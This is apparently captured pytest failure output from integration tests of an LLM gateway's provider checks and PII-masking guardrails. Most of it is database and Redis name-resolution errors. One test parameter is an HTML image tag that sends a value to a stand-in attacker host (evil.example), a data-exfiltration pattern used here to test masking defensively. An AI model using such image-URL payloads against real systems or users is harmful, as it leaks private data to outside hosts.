+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+=================================== FAILURES ===================================
+________________ test_03a_9_unresolvable_host_is_a_failed_test _________________
+
+root = <starlette.testclient.TestClient object at 0x7fed085fb5c0>
+app = <fastapi.applications.FastAPI object at 0x7fede537bfb0>
+app_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+make_project = <function make_project.<locals>.make at 0x7fed084b7380>
+
+    def test_03a_9_unresolvable_host_is_a_failed_test(root, app, app_settings, make_project):
+        # 10a-forms (K-10af-0003): a provider host that does not resolve is a failed test (200 +
+        # connection_failed), unsaved and stored, never a 500.
+        from ffcore.core.config import get_settings
+    
+        host = "no-such-provider.invalid"
+        allowed = app_settings.model_copy(update={"allowed_internal_hosts": [host]})
+        app.dependency_overrides[get_settings] = lambda: allowed
+        body = {"driver": "ollama", "config": {"base_url": f"http://{host}:11434"}}
+        unsaved = root.post(f"{API}/providers/test", json=body)
+        assert unsaved.status_code == 200
+>       assert (unsaved.json()["ok"], unsaved.json()["code"]) == (False, "connection_failed")
+E       AssertionError: assert (False, 'egress_timeout') == (False, 'connection_failed')
+E         
+E         At index 1 diff: 'egress_timeout' != 'connection_failed'
+E         Use -v to get more diff
+
+tests/integration/test_03a_providers.py:203: AssertionError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:35:12,201 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-18a2d8894c.chat code=egress_not_allowlisted
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-1e6a8e7577.chat code=egress_not_allowlisted
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p29d2f28c.chat-default code=egress_not_allowlisted
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-778dae318b.chat code=egress_not_allowlisted
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-93a7c8c3d0.chat-default code=egress_not_allowlisted
+2026-11-05 01:35:12,424 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-9f7e587248.chat-default code=egress_not_allowlisted
+2026-11-05 01:35:12,425 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p-a238fafdd9.chat code=egress_not_allowlisted
+2026-11-05 01:35:12,425 ERROR ffcore.litellm_reconcile litellm_model_not_written model=proj-9c0e06.chat-default code=egress_not_allowlisted
+2026-11-05 01:35:12,425 ERROR ffcore.litellm_reconcile litellm_model_not_written model=proj-d6a9d9.chat-default code=egress_not_allowlisted
+2026-11-05 01:35:12,425 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=9
+2026-11-05 01:35:12,444 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=228
+------------------------------ Captured log setup ------------------------------
+ERROR    ffcore.readiness:readiness.py:63 warmup failed: ModelMissing
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-18a2d8894c.chat code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-1e6a8e7577.chat code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p29d2f28c.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-778dae318b.chat code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-93a7c8c3d0.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-9f7e587248.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p-a238fafdd9.chat code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=proj-9c0e06.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=proj-d6a9d9.chat-default code=egress_not_allowlisted
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=9
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=228
+----------------------------- Captured stderr call -----------------------------
+2026-11-05 01:35:21,547 INFO ffcore.access access method=POST path=/api/v1/providers/test status=200 ms=9099
+------------------------------ Captured log call -------------------------------
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/providers/test status=200 ms=9099
+__________ test_08t_m1_reserve_moves_the_counter_past_carried_numbers __________
+
+self = <redis.asyncio.connection.Connection(host=redis,port=6379,db=0)>
+
+    async def connect(self):
+        """Connects to the Redis server if not already connected"""
+        if self.is_connected:
+            return
+        try:
+>           await self.retry.call_with_retry(
+                lambda: self._connect(), lambda error: self.disconnect()
+            )
+
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/connection.py:290: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/retry.py:59: in call_with_retry
+    return await do()
+           ^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/connection.py:723: in _connect
+    reader, writer = await asyncio.open_connection(
+/usr/local/lib/python3.12/asyncio/streams.py:48: in open_connection
+    transport, _ = await loop.create_connection(
+/usr/local/lib/python3.12/asyncio/base_events.py:1083: in create_connection
+    infos = await self._ensure_resolved(
+/usr/local/lib/python3.12/asyncio/base_events.py:1466: in _ensure_resolved
+    return await loop.getaddrinfo(host, port, family=family, type=type,
+/usr/local/lib/python3.12/asyncio/base_events.py:905: in getaddrinfo
+    return await self.run_in_executor(
+/usr/local/lib/python3.12/concurrent/futures/thread.py:59: in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+host = 'redis', port = 6379, family = 0, type = <SocketKind.SOCK_STREAM: 1>
+proto = 0, flags = 0
+
+    def getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
+        """Resolve host and port into list of address info entries.
+    
+        Translate the host/port argument into a sequence of 5-tuples that contain
+        all the necessary arguments for creating a socket connected to that service.
+        host is a domain name, a string representation of an IPv4/v6 address or
+        None. port is a string service name such as 'http', a numeric port number or
+        None. By passing None as the value of host and port, you can pass NULL to
+        the underlying C API.
+    
+        The family, type and proto arguments can be optionally specified in order to
+        narrow the list of addresses returned. Passing zero as a value for each of
+        these arguments selects the full range of results.
+        """
+        # We override this function since we want to translate the numeric family
+        # and socket type values to enum constants.
+        addrlist = []
+>       for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E       socket.gaierror: [Errno -3] Temporary failure in name resolution
+
+/usr/local/lib/python3.12/socket.py:978: gaierror
+
+During handling of the above exception, another exception occurred:
+
+    def test_08t_m1_reserve_moves_the_counter_past_carried_numbers():
+        async def body(store):
+            await store.reserve("run-c", 7)
+            await store.reserve("run-c", 3)  # never backwards
+            return await store.token_for("run-c", "PERSON:x", "x")
+    
+>       assert _with_store(60, body) == "<<PII_8>>"
+               ^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_08t_m1_counter.py:69: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/test_08t_m1_counter.py:25: in _with_store
+    return asyncio.run(go())
+           ^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+tests/integration/test_08t_m1_counter.py:21: in go
+    return await body(RedisTokenStore(client, ttl, prefix=f"t08m1:{uuid.uuid4().hex}:"))
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+tests/integration/test_08t_m1_counter.py:65: in body
+    await store.reserve("run-c", 7)
+ffcore/guardrails/masking.py:214: in reserve
+    await self._redis.eval(_RESERVE, 1, counter, number, COUNTER_TTL_S)
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/client.py:641: in execute_command
+    conn = self.connection or await pool.get_connection()
+                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/connection.py:1100: in get_connection
+    await self.ensure_connection(connection)
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/connection.py:1133: in ensure_connection
+    await connection.connect()
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <redis.asyncio.connection.Connection(host=redis,port=6379,db=0)>
+
+    async def connect(self):
+        """Connects to the Redis server if not already connected"""
+        if self.is_connected:
+            return
+        try:
+            await self.retry.call_with_retry(
+                lambda: self._connect(), lambda error: self.disconnect()
+            )
+        except asyncio.CancelledError:
+            raise  # in 3.7 and earlier, this is an Exception, not BaseException
+        except (socket.timeout, asyncio.TimeoutError):
+            raise TimeoutError("Timeout connecting to server")
+        except OSError as e:
+>           raise ConnectionError(self._error_message(e))
+E           redis.exceptions.ConnectionError: Error -3 connecting to redis:6379. Temporary failure in name resolution.
+
+/opt/venv/lib/python3.12/site-packages/redis/asyncio/connection.py:298: ConnectionError
+_ test_08t_r2_direct_url_lines_keep_the_placeholder[<img src="https://evil.example/a b?q= {v}">] _
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec574f41a0>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+direct = (UUID('b95c19bd-4b2c-4188-91c0-797a92143c0b'), <starlette.testclient.TestClient object at 0x7fec72630530>, {'id': '90d...ame': 'facade', 'key_prefix': 'ffk_c41b300f', ...}, <tests.integration.facade_support.Facade object at 0x7fec69500890>)
+shape = '<img src="https://evil.example/a b?q= {v}">'
+
+    @pytest.mark.usefixtures("clean_litellm")
+    @pytest.mark.parametrize("shape", URL_SHAPES)
+    def test_08t_r2_direct_url_lines_keep_the_placeholder(direct, shape):
+        _, _, _, client = direct
+        text = shape.format(v=EMAIL)
+>       response = client.chat("tooly", messages=_tool_turn(text), tools=[TOOL])
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_08t_r2_paths.py:52: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/facade_support.py:48: in chat
+    return self._client.post(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1203: in post
+    return self.request(
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:518: in request
+    return super().request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:993: in send
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:987: in send
+    response.read()
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:877: in read
+    self._content = b"".join(self.iter_bytes())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:893: in iter_bytes
+    for raw_bytes in self.iter_raw():
+                     ^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:948: in iter_raw
+    for raw_stream_bytes in self.stream:
+                            ^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:143: in __iter__
+    yield from self._stream
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:384: in iter_body
+    exit_stack.close()
+/usr/local/lib/python3.12/contextlib.py:618: in close
+    self.__exit__(None, None, None)
+/usr/local/lib/python3.12/contextlib.py:610: in __exit__
+    raise exc_details[1]
+/usr/local/lib/python3.12/contextlib.py:595: in __exit__
+    if cb(*exc_details):
+       ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:399: in close_app
+    raise exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:366: in run_app
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1194: in __call__
+    await super().__call__(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:186: in __call__
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:164: in __call__
+    await self.app(scope, receive, _send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:261: in __call__
+    await self.app(scope, receive, send_status)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:63: in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2811: in app
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1865: in _handle_selected
+    await original_route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1328: in handle
+    await effective_context.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:166: in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:152: in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:745: in app
+    raw_response = await run_endpoint_function(
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:372: in run_endpoint_function
+    return await dependant.call(**values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/api/facade.py:104: in chat_completions
+    return await facade_proxy.complete(request, caller, target, body, settings)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/services/facade_proxy.py:237: in complete
+    return await _answer(caller, target, model, result, settings, guard.scope)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/services/facade_proxy.py:280: in _answer
+    await _commit(settings, caller, model_id, result.call_id, result.usage or {}, model_name)
+ffcore/services/facade_proxy.py:266: in _commit
+    await gate.commit(call_id=call_id, model_id=model, model_name=model_name, usage=usage)
+ffcore/services/quota.py:464: in commit
+    cost = price(await self._pricing(model_id), tokens_in, tokens_out)
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/services/quota.py:424: in _pricing
+    return await self._session.scalar(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:720: in scalar
+    return await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2534: in scalar
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+<sqlalchemy generated _go() wrapper for sqlalchemy.orm.session.SessionTransaction._connection_for_bind>:2: in _connection_for_bind
+    return target(fn, self, bind, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
